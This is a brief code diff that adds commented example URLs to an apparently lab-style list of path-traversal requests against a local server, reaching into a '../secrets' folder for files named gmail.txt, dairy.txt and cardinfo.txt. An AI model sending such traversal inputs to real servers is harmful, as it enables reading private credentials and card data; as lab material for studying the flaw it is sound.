@@ -41,3 +41,6 @@
 # http://127.0.0.1:3000/files/download?file=../secrets/info.txt
 # http://127.0.0.1:3000/files/download?file=../secrets/notes.txt
 # http://127.0.0.1:3000/files/download?file=../secrets/notes(1).txt
+# http://127.0.0.1:3000/files/download?file=../secrets/gmail.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/dairy.txt
+# http://127.0.0.1:3000/files/download?file=../secrets/cardinfo.txt
